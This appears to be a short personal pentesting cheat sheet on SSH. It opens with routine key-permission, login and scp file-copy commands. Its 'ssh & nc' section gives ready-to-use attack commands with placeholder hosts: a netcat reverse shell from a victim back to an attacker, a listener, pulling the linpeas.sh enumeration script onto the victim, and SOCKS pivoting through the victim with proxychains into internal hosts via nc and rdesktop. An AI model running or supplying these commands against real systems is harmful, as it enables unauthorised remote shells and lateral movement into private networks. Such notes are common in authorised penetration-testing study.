# SSH Secure Shell Protocol

```
C:\\Users\\username\\.ssh\\id_rsa
```

```
chmod 600 ssh_key
```

```
ssh -i ssh_key user@ip
```

### Copy a Local File to a Remote System

```
scp localfile  remoteusername@remotehost:/remote/directory
```

### Copy a Remote File to a Local System

```
scp remoteusername@remotehost:/remotefile /local/directory
```

## ssh & nc

```
ssh username@victim-ip "nc attacker-ip port -e /bin/bash"
```

```
nc -nlvp port
```

```
ssh username@victim-ip "nc attacker-ip port > linpeas.sh"
```

```
ssh username@ip -p2222
```

```
ssh -D 9050 victimUsername@victimIP

netstat -antup 9050

sudo nano /etc/proxychains4.conf

sudo proxychains nc -nv $victim'sInternalIP 80/445

sudo proxychains rdesktop $victimIP
```

![](Pasted%20image%2020231030122335.png)

